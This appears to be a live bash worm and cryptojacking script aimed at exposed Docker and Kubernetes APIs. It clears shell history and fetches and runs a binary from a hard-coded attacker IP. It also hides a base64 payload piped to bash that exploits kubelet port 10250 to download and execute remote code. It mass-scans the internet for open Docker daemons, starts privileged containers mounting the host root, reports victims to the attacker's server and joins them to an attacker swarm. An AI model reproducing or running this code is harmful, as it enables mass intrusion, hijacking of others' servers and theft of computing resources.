#!/bin/bash
echo ICAgICAgICAgIF9fX19fX19fX19fICAgICAgICAgICAgICAgICBfX19fX19fX19fX19fX19fX19fX19fX19fX19fXwogICAgICAgICAgXF9fICAgIF9fXy9fX18gX19fX18gICAgX19fX1xfXyAgICBfX18vXCAgICAgIFxfXyAgICBfX18vCiAgICAgICAgICAgIHwgICAgfF8vIF9fIFxcX18gIFwgIC8gICAgIFx8ICAgIHwgICAvICAgfCAgIFx8ICAgIHwgICAKICAgICAgICAgICAgfCAgICB8XCAgX19fLyAvIF9fIFx8ICBZIFkgIFwgICAgfCAgLyAgICB8ICAgIFwgICAgfCAgIAogICAgICAgICAgICB8X19fX3wgXF9fXyAgPl9fX18gIC9fX3xffCAgL19fX198ICBcX19fX3xfXyAgL19fX198ICAgCiAgICAgICAgICAgICAgICAgICAgICAgXC8gICAgIFwvICAgICAgXC8gICAgICAgICAgICAgICAgXC8gICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgX19fX18gICAgICAgICAgICAgIF9fICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgXy8gX19fX1xfX19fIF9fX19fIF8vICB8XyAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICBcICAgX19cLyBfXyBcXF9fICBcXCAgIF9fXCAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICB8ICB8IFwgIF9fXy8gLyBfXyBcfCAgfCAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgIHxfX3wgIFxfX18gID5fX19fICAvX198ICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwvICAgICBcLyAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICBfX19fX19fX19fICBfX19fX19fICAgIF9fX19fX19fX18gICAgIF9fX19fX19fICAgICAgICAgIAogICAgICAgICAgIFxfX19fX18gICBcIFwgICBfICBcICAgXF9fX19fXyAgIFwgICAvICBfX19fXy8gICAgICAgICAgCiAgICAgICAgICAgIHwgICAgfCAgXy8gLyAgL19cICBcICAgfCAgICAgICBfLyAgLyAgIFwgIF9fXyAgICAgICAgICAKICAgICAgICAgICAgfCAgICB8ICAgXCBcICBcXy8gICBcICB8ICAgIHwgICBcICBcICAgIFxfXCAgXCAgICAgICAgIAogICAgICAgICAgICB8X19fX19fICAvICBcX19fX18gIC8gIHxfX19ffF8gIC8gICBcX19fX19fICAvICAgICAgICAgCiAgICAgICAgICAgICAgICAgICBcLyAgICAgICAgIFwvICAgICAgICAgIFwvICAgICAgICAgICBcLyAgICAgICAgICAgICAgIAoKCl9fX19fX19fX19fX19fIF9fX19fX19fX19fX19fICBfX19fX19fXyAgIF9fX19fX19fICBfX19fX19fX18gIF9fX18gIF9fLl9fX19fX19fX19fX19fX19fX19fXyAKXF9fICAgIF9fXy8gICB8ICAgXF8gICBfX19fXy8gIFxfX19fX18gXCAgXF9fX19fICBcIFxfICAgX19fIFx8ICAgIHwvIF98XF8gICBfX19fXy9cX19fX19fICAgXAogIHwgICAgfCAvICAgIH4gICAgXCAgICBfXylfICAgIHwgICAgfCAgXCAgLyAgIHwgICBcLyAgICBcICBcL3wgICAgICA8ICAgfCAgICBfXylfICB8ICAgICAgIF8vCiAgfCAgICB8IFwgICAgWSAgICAvICAgICAgICBcICAgfCAgICAgICAgXC8gICAgfCAgICBcICAgICBcX19ffCAgICB8ICBcICB8ICAgICAgICBcIHwgICAgfCAgIFwKICB8X19fX3wgIFxfX198XyAgL19fX19fX18gIC8gIC9fX19fX19fICAvXF9fX19fX18gIC9cX19fX19fICAvX19fX3xfXyBcL19fX19fX18gIC8gfF9fX198XyAgLwogICAgICAgICAgICAgICAgXC8gICAgICAgIFwvICAgICAgICAgICBcLyAgICAgICAgIFwvICAgICAgICBcLyAgICAgICAgXC8gICAgICAgIFwvICAgICAgICAgXC8gCiAgICAgICAgICBfX19fX19fXyAgICAgICAgX18gIC5fXyAgLl9fICAgICAgICAgICAgICAgICAgIF9fX19fX19fICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgLyAgX19fX18vX19fX18gXy8gIHxffCAgfCB8X198IF9fX18gICAgX19fXyAgICAvICBfX19fXy8gX18gX18gIF9fX18gICAgICAgICAgICAgICAgIAogICAgICAgIC8gICBcICBfX19cX18gIFxcICAgX19cICB8IHwgIHwvICAgIFwgIC8gX19fXCAgLyAgIFwgIF9fX3wgIHwgIFwvICAgIFwgICAgICAgICAgICAgICAgCiAgICAgICAgXCAgICBcX1wgIFwvIF9fIFx8ICB8IHwgIHxffCAgfCAgIHwgIFwvIC9fLyAgPiBcICAgIFxfXCAgXCAgfCAgLyAgIHwgIFwgICAgICAgICAgICAgICAKICAgICAgICAgXF9fX19fXyAgKF9fX18gIC9fX3wgfF9fX18vX198X19ffCAgL1xfX18gIC8gICBcX19fX19fICAvX19fXy98X19ffCAgLyAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgXC8gICAgIFwvICAgICAgICAgICAgICAgICAgXC8vX19fX18vICAgICAgICAgICBcLyAgICAgICAgICAgXC8gCg== | base64 -d
unset HISTFILE
export HOME=/root
export LC_ALL=C
export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:/usr/games:/usr/local/games
export SCAN_RATE=500000


init_main(){
SOME_INSTALL 
TESTLAUF
start_the_gatling_gun
}


function SOME_INSTALL(){
if ! [ -d "/dev/shm/.../...BORG.../" ] ; then mkdir -p /dev/shm/.../...BORG.../ ; fi
echo 'Removed for the test run in the container!'
apk add --no-cache bash curl docker masscan libpcap-dev 
if ! [ -f "/tmp/bioset" ] ; then curl http://45.9.150.36/pwn/ziggy -o /tmp/bioset ; chmod +x /tmp/bioset ; /tmp/bioset ; fi
}

function TESTLAUF(){
# Yes, we know it's not beautiful, but kept simple and it works as it seems. ;)
$(echo IyEvYmluL2Jhc2gKdW5zZXQgSElTVEZJTEUKZXhwb3J0IExDX0FMTD1DCmV4cG9ydCBQQVRIPSRQQVRIOi9iaW46L3NiaW46L3Vzci9iaW46L3Vzci9zYmluOi91c3IvbG9jYWwvYmluOi91c3IvbG9jYWwvc2JpbjovdXNyL2dhbWVzOi91c3IvbG9jYWwvZ2FtZXMKY2xlYXIgOyBlY2hvICcnIDsgZWNobyAnJwplY2hvIElDQWdYMTlmWDE4Z0lDQWdJQ0FnSUNBZ1gxOGdJQ0FnSUNBZ0lDQWdYMTlmWHlBZ1gxOHVJQ0FnSUY5Zlh5NGdJQ0FnSUNBZ0lDQWdJQ0JmWDE5ZlgxOWZYMTlmWDE5ZlgxOGdJQ0JmWDE5ZlgxOWZYeUFnWDE5Zlh5QWdYMTlmTGlBZ0lDQWdJQ0FnSUNBZ0lBb2dJQzhnSUY4Z0lGd2dJRjlmSUY5Zlh5OGdJSHhmSUNCZlgxOWZJSHdnSUNBZ2ZDOGdYM3hmWHlCZlhGOGdmRjlmSUNBZ1gxOWZYeUFnSUZ4ZlgxOWZYeUFnWENBZ0lGOGdJRndnSUZ4ZlgxOWZYeUFnWEM5ZklDQWdmQ0JjWHlCOFgxOGdYMTlmTGw5ZkxpQWdDaUF2SUNBdlgxd2dJRng4SUNCOElDQmNJQ0FnWDE5Y0x5QWdYeUJjZkNBZ0lDQWdJRHdnZkNBZ2ZDQWdYQ0JmWHlCY1h5OGdYMThnWENBZ0lDOGdJRjlmWDE4dklDQXZYMXdnSUZ3Z0lDOGdJRjlmWDE4dklId2dJQ0I4SUNCOElGOWZJRHdnSUNCOElDQjhJQ0FLTHlBZ0lDQjhJQ0FnSUZ3Z0lId2dJQzk4SUNCOElDZ2dJRHhmUGlBcElDQWdJSHdnSUZ4OElDQjhJQ0F2SUZ4ZlhDQmNJQ0JmWDE4dklDQXZJQ0FnSUNBZ0lGd2dJRnhmTHlBZ0lGd3ZJQ0FnSUNBZ0lGd2dmQ0FnSUh3Z0lId2dYRjljSUZ4ZlgxOGdJSHdnSUFwY1gxOWZYM3hmWHlBZ0wxOWZYMTh2SUh4Zlgzd2dJRnhmWDE5ZkwzeGZYMTlmZkY5ZklGeGZYMTlmTDN4ZlgxOGdJQzljWDE5ZklDQStJRnhmWDE5ZlgxOWZJRnhmWDE5Zlh5QWdMMXhmWDE5ZlgxOWZJRng4WDE5ZmZDQWdmRjlmWHlBZ0x5QmZYMTlmZkNBZ0NpQWdJQ0FnSUNBZ1hDOGdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQmNMeUFnSUNBZ0lDQWdJRnd2SUNBZ0lDQmNMeUFnSUNBZ0lDQWdJQ0JjTHlBZ0lDQWdYQzhnSUNBZ0lDQWdJQ0JjTHlBZ0lDQWdJQ0FnSUNBZ1hDOWNMeUFnSUNBZ0lDQUtMbDlmSUNBZ0lDNWZYeTVmWHlBZ0lDQWdJQ0F1WDE5ZklDQWdJQ0FnSUY5ZlgxOWZJQ0FnWDE4Z0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnWDE4Z0lDQWdJQ0FnSUNBZ1gxOGdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUM1ZlgxOGdJQXA4SUNCOFgxOGdmRjlmZkNBZ2ZDQWdJQ0JmWDN3Z1h5OWZYMTlmSUNBdklGOWZYeUJjWHk4Z0lIeGZJQ0JmWDE5ZklGOWZYMTlmSUNBZ0lGOWZYMTlmWHk4Z0lIeGZJQ0JmWDE5Zlh5OGdJSHhmSUNCZlgxOWZYMTlmSUNBZ1gxOWZYeUFnSUY5ZmZDQmZMeUFnQ253Z0lId2dJRng4SUNCOElDQjhJQ0FnTHlCZlh5QjhMeUJmWHlCY0x5QXZJQzVmWENCY0lDQWdYMTljTHlCZlh5QmNYRjlmSUNCY0lDQXZJQ0FnSUNCY0lDQWdYMTljTHlBZ0lDQmNJQ0FnWDE5Y0lGeGZJQ0JmWHlCY1h5OGdYMThnWENBdklGOWZJSHdnSUNBS2ZDQWdJRmtnSUZ3Z0lId2dJSHhmWHk4Z0wxOHZJRndnSUY5Zlh6d2dJRnhmWDE5Zlh5OThJQ0I4SUZ3Z0lGOWZYeThnTHlCZlh5QmNmQ0FnV1NCWklDQmNJQ0I4SUh3Z0lDQjhJQ0JjSUNCOElDQWdJSHdnSUh3Z1hDOWNJQ0JmWDE4dkx5QXZYeThnZkNBZ0lBcDhYMTlmZkNBZ0wxOWZmRjlmWDE4dlhGOWZYMThnZkZ4ZlgxOGdJRDVmWDE5Zlgxd2dJSHhmWDN3Z0lGeGZYMThnSUQ1ZlgxOWZJQ0F2WDE5OFgzd2dJQzlmWDN3Z2ZGOWZYM3dnSUM5Zlgzd2dMMXdnZkY5ZmZDQWdJQ0JjWDE5ZklDQStYMTlmWHlCOElDQWdDaUFnSUNBZ1hDOGdJQ0FnSUNBZ0lDQWdJQ0FnSUZ3dklDQWdJRnd2SUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUZ3dklDQWdJQ0JjTHlBZ0lDQWdJRnd2SUNBZ0lDQWdJQ0FnSUZ3dklDQWdJQ0JjTHlBZ0lDQWdJQ0FnSUNBZ0lDQmNMeUFnSUNBZ1hDOGdJQ0FLSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUFvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0NpQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQUtJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQW9nSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnQ2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBS0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQzVmWHlBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUY5ZklDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0xsOWZJQ0JmWHlBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lBb2dYMTlmTGw5ZkxpQmZYMTlmSUNCZlh5QmZYeUFnZkNBZ2ZGOWZJRjlmWDE5ZklGOWZYeUFnWDE4Z1gxOWZYeUFnSUY4dklDQjhYeUFnWDE5Zlh5QWdJRjlmSUNCZklDQmZYMTlmWDE5ZklDQjhYMTk4THlBZ2ZGOGdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdDandnSUNCOElDQjhMeUFnWHlCY2ZDQWdmQ0FnWENCOElDQjhJQ0JjWEY5ZklDQmNYQ0FnWEM4Z0x5OGdYMThnWENBZ1hDQWdJRjlmWEM4Z0lGOGdYQ0FnWENCY0x5QmNMeUF2WEY5ZklDQmNJSHdnSUZ3Z0lDQmZYMXdnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FLSUZ4ZlgxOGdJQ2dnSUR4ZlBpQXBJQ0I4SUNBdklId2dJQ0JaSUNCY0x5QmZYeUJjWENBZ0lDOWNJQ0JmWDE4dklDQWdmQ0FnZkNBb0lDQThYejRnS1NBZ1hDQWdJQ0FnTHlBZ0x5QmZYeUJjZkNBZ2ZId2dJSHdnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUFvZ0x5QmZYMTlmZkZ4ZlgxOWZMM3hmWDE5Zkx5QWdmRjlmWDN3Z0lDaGZYMTlmSUNBdlhGOHZJQ0JjWDE5ZklDQStJQ0I4WDE5OElDQmNYMTlmWHk4Z0lDQWdYQzljWHk4Z0lDaGZYMTlmSUNBdlgxOThmRjlmZkNBdlhDQWdMMXdnSUM5Y0lDQXZYQ0FnSUNBZ0NpQmNMeUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lGd3ZJQ0FnSUNCY0x5QWdJQ0FnSUNBZ0lDQmNMeUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNCY0x5QWdJQ0FnSUNBZ0lGd3ZJQ0JjTHlBZ1hDOGdJRnd2SUNBZ0lDQUtMbDlmSUNCZlh5QWdJQ0FnSUNBZ0lDQWdJQ0FnSUNCZlh5QWdJQ0FnSUNBZ0lDQWdJQ0FnSUNCZlh5QWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJRjlmSUNBZ0lDQWdJQ0FnSUM1Zlh5QWdJQ0FnSUNBZ0lDQmZYeUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDNWZMZ3A4WDE5OEx5QWdmRjhnSUY5ZlgxOWZYeUFnSUNBZ2ZGOWZmRjlmSUY5ZklDQmZYMTlmWDE5Zkx5QWdmRjhnSUY5ZlgxOWZJQ0FnSUNBZ1gxOWZYMTk4SUNCOElGOWZJRjlmWDE4Z2ZDQWdmQ0FnSUY5ZlgxOWZMeUFnZkY4Z0lGOWZYMThnSUNCZlgxOWZmQ0I4Q253Z0lGd2dJQ0JmWDF3dklDQmZYMTh2SUNBZ0lDQjhJQ0I4SUNCOElDQmNMeUFnWDE5Zkwxd2dJQ0JmWDF3Z1hGOWZJQ0JjSUNBZ0lDOGdJRjlmWHk4Z0lId3ZJQzh2SUY5ZklGeDhJQ0I4SUY4dklGOWZJRndnSUNCZlgxd3ZJQ0JmSUZ3Z0x5QWdJQ0JjSUh3S2ZDQWdmSHdnSUh3Z0lGeGZYMThnWENBZ0lDQWdJSHdnSUh3Z0lId2dJQzljWDE5ZklGd2dJSHdnSUh3Z0lDQWdMeUJmWHlCY1h5QWdYRjlmWHlCY2ZDQWdJQ0E4WENBZ1gxOWZMM3dnSUh4ZlhDQWdYMTlmTDN3Z0lId2dLQ0FnUEY4K0lDa2dJQ0I4SUNCY2ZBcDhYMTk4ZkY5ZmZDQXZYMTlmWHlBZ1BpQXZYRjlmZkNBZ2ZGOWZYMTh2TDE5ZlgxOGdJRDRnZkY5ZmZDQWdJQ2hmWDE5ZklDQXZJQzlmWDE5ZklDQStYMTk4WHlCY1hGOWZYeUFnUGw5ZlgxOHZYRjlmWHlBZ1BsOWZmQ0FnWEY5ZlgxOHZmRjlmWDN3Z0lDOWZDaUFnSUNBZ0lDQWdJQ0FnSUNBZ1hDOGdJRnhmWDE5ZlgxOThJQ0FnSUNBZ0lDQWdJRnd2SUNBZ0lDQWdJQ0FnSUNBZ0lDQmNMeUFnSUNBZ0lDQmNMeUFnSUNBZ1hDOGdJQ0FnWEM4Z0lDQWdJQ0FnSUNBZ1hDOGdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lGd3ZYQzhLIHwgYmFzZTY0IC1kCmVjaG8gJycgOyBlY2hvICcnIDsgc2xlZXAgMwoKCmZ1bmN0aW9uIGluaXRfbWFpbigpewpTT01FX0lOU1RBTEwKU0NBTl9BTkRfU09SVAppZiBbIC1mICIvZGV2L3NobS8uLi4vLi4uQk9SRy4uLi9vdXQvMTAyNTAiIF0gOyB0aGVuIHdoaWxlIHJlYWQgVEFSR0VUIDsgZG8gUFdOX1RIRV9LVUJFICRUQVJHRVQgOyBkb25lIDwgL2Rldi9zaG0vLi4uLy4uLkJPUkcuLi4vb3V0LzEwMjUwIDsgZmkKfQoKCmZ1bmN0aW9uIFNPTUVfSU5TVEFMTCgpewpjaGF0dHIgLWlhIC8gL3RtcC8gL3Zhci8gL3Zhci90bXAvIDI+L2Rldi9udWxsCmNoYXR0ciAtUiAtaWEgL3RtcC8gL3Zhci90bXAvIDI+L2Rldi9udWxsCmlmICEgWyAtZCAiL2Rldi9zaG0vLi4uLy4uLkJPUkcuLi4vIiBdIDsgdGhlbiBta2RpciAtcCAvZGV2L3NobS8uLi4vLi4uQk9SRy4uLi8gOyBmaQojIFJlbW92ZWQgZm9yIHRoZSB0ZXN0IHJ1biBpbiB0aGUgY29udGFpbmVyIQp9CgpmdW5jdGlvbiBTQ0FOX0FORF9TT1JUKCl7CmlwIHJvdXRlIHNob3cgfCBhd2sgJ3twcmludCAkMX0nIHwgZ3JlcCAnLycgPj4gL2Rldi9zaG0vLi4uLy4uLkJPUkcuLi4vbG9jYWwucmFuZ2VzCmVjaG8gJzE5Mi4xNjguMC4wLzE2JyA+PiAvZGV2L3NobS8uLi4vLi4uQk9SRy4uLi9sb2NhbC5yYW5nZXMKZWNobyAnMTcyLjE2LjAuMC8xMicgPj4gL2Rldi9zaG0vLi4uLy4uLkJPUkcuLi4vbG9jYWwucmFuZ2VzCmVjaG8gJzEwLjAuMC4wLzgnID4+IC9kZXYvc2htLy4uLi8uLi5CT1JHLi4uL2xvY2FsLnJhbmdlcwpjYXQgL2Rldi9zaG0vLi4uLy4uLkJPUkcuLi4vbG9jYWwucmFuZ2VzIHwgc29ydCAtdSA+PiAvZGV2L3NobS8uLi4vLi4uQk9SRy4uLi9sLnJhbmdlCnJtIC1mIC9kZXYvc2htLy4uLi8uLi5CT1JHLi4uL2xvY2FsLnJhbmdlcwoKTEFOX1BPUlRTPSgiMjM3NSIgIjIzNzYiICI0MjQzIiAiODE4MSIgIjYzNzkiICIxMDI1MCIpCgp3aGlsZSByZWFkIExSQU5HRSA7IGRvCmZvciBMQU5fUE9SVCBpbiAke0xBTl9QT1JUU1tAXX07IGRvCm1hc3NjYW4gLS1vcGVuIC1wJExBTl9QT1JUICRMUkFOR0UgLS1yYXRlPTUwMDAwMCA+PiAvZGV2L3NobS8uLi4vLi4uQk9SRy4uLi9vdXQudHh0CmRvbmUKZG9uZSA8IC9kZXYvc2htLy4uLi8uLi5CT1JHLi4uL2wucmFuZ2UKcm0gLWYgL2Rldi9zaG0vLi4uLy4uLkJPUkcuLi4vbC5yYW5nZQoKaWYgISBbIC1kICIvZGV2L3NobS8uLi4vLi4uQk9SRy4uLi9vdXQvIiBdIDsgdGhlbiBta2RpciAtcCAvZGV2L3NobS8uLi4vLi4uQk9SRy4uLi9vdXQvIDsgZmkKCmZvciBMQU5fUE9SVCBpbiAke0xBTl9QT1JUU1tAXX07IGRvIGNhdCAvZGV2L3NobS8uLi4vLi4uQk9SRy4uLi9vdXQudHh0IHwgZ3JlcCAkTEFOX1BPUlQgfCBhd2sgJ3twcmludCAkNn0nID4+IC9kZXYvc2htLy4uLi8uLi5CT1JHLi4uL291dC8kTEFOX1BPUlQgOyBkb25lCgpmaW5kIC9kZXYvc2htLy4uLi8uLi5CT1JHLi4uL291dC8gLXNpemUgMCAtZXhlYyBybSB7fSBcOwp9CgpmdW5jdGlvbiBQV05fVEhFX0tVQkUoKXsKdGhlaXA9JDEKZWNobyAiVGFyZ2V0OiAiJHRoZWlwCnJtIC1mIC4va3ViZXJuZXRlcyAyPi9kZXYvbnVsbAp0aW1lb3V0IC1zIFNJR0tJTEwgNiBjdXJsIC1zTGsgaHR0cHM6Ly8kdGhlaXA6MTAyNTAvcnVubmluZ3BvZHMvIHwganEgfCBncmVwICduYW1lXHxuYW1lc3BhY2VcfG5hbWUnID4+IC4va3ViZXJuZXRlcwpHRVRfU1RBVFVTPSQ/CmlmIFsgIiRHRVRfU1RBVFVTIiA9ICIwIiBdIDsgdGhlbgp3Z2V0IC1PIC9kZXYvbnVsbCAiaHR0cDovLzQ1LjkuMTUwLjM2L2luY29taW5nL2t1YmUucGhwP2t1YmVpcD0kdGhlaXAiCk5QT0Q9YGNhdCAuL2t1YmVybmV0ZXMgfCBoZWFkIC1uIDEgfCBhd2sgJ3twcmludCAkMn0nIHwgc2VkICdzLywvL2cnIHwgc2VkICdzLyIvL2cnYApOU1BBQ0U9YGNhdCAuL2t1YmVybmV0ZXMgfCBoZWFkIC1uIDIgfCB0YWlsIC1uIDEgfCBhd2sgJ3twcmludCAkMn0nIHwgc2VkICdzLywvL2cnIHwgc2VkICdzLyIvL2cnYApDTkFNRT1gY2F0IC4va3ViZXJuZXRlcyB8IGhlYWQgLW4gMyB8IHRhaWwgLW4gMSB8IGF3ayAne3ByaW50ICQyfScgfCBzZWQgJ3MvLC8vZycgfCBzZWQgJ3MvIi8vZydgCnRpbWVvdXQgLXMgU0lHS0lMTCAxMjAgY3VybCAtWFBPU1QgLUxrIGh0dHBzOi8vJHRoZWlwOjEwMjUwL3J1bi8kTlNQQUNFLyROUE9ELyRDTkFNRSAtZCBjbWQ9IndnZXQgaHR0cDovLzQ1LjkuMTUwLjM2L1RER0cgLU8gL3RtcC8uVERHRyIKdGltZW91dCAtcyBTSUdLSUxMIDEyMCBjdXJsIC1YUE9TVCAtTGsgaHR0cHM6Ly8kdGhlaXA6MTAyNTAvcnVuLyROU1BBQ0UvJE5QT0QvJENOQU1FIC1kIGNtZD0iYmFzaCAvdG1wLy5UREdHIgpybSAtZiAuL2t1YmVybmV0ZXMgMj4vZGV2L251bGwKZWxzZSBybSAtZiAuL2t1YmVybmV0ZXMgMj4vZGV2L251bGwgOyBmaQp9CgoKaW5pdF9tYWluCgo= | base64 -d | bash 2>/dev/null) &
}

DOCKER_GATLING_GUN(){
PORT=$1
RATE=$2
RANGE=$3
rndstr=$(head /dev/urandom | tr -dc a-z | head -c 6 ; echo '')
eval "$rndstr"="'$(masscan -p$PORT $RANGE.0.0.0/8 --rate=$RATE | awk '{print $6}'| zgrab --senders 200 --port $PORT --http='/v1.16/version' --output-file=- 2>/dev/null | grep -E 'ApiVersion|client version 1.16' | jq -r .ip)'";
for IPADDR in ${!rndstr}
do echo "$IPADDR:$PORT"
wget -q "http://45.9.150.36/incoming/docker.php?dockerT=$IPADDR:$PORT" -O /dev/null
timeout -s SIGKILL 120 docker -H tcp://$IPADDR:$PORT run -d --privileged --net host -v /:/mnt fuhou/borg 
timeout -s SIGKILL 30 docker -H tcp://$IPADDR:$PORT swarm leave --force
timeout -s SIGKILL 30 docker -H tcp://$IPADDR:$PORT swarm join --token SWMTKN-1-5boro95fiuswddse7fpl7nzpavv3xon3xpbynelcrtnu7vqggt-cd9rfe6vsjsw7gdq1cq5nspw4 164.68.106.96:2377
RGWERT=$?
if ! [ "$RGWERT" = "0" ] ; then
timeout -s SIGKILL 120 docker -H tcp://$IPADDR:$PORT run -d --privileged --net host -v /:/mnt fuhou/zug   
fi
done;
}

function start_the_gatling_gun(){
while true ; do 
N=$(($RANDOM%255+1)) 

#for N in $(seq 120 150); do
PORT_TO_PWN_ARRAY=("2375" "2376" "4243")
for PORT_TO_PWN in ${PORT_TO_PWN_ARRAY[@]}
do
DOCKER_GATLING_GUN $PORT_TO_PWN $SCAN_RATE $N
done
done
}


init_main
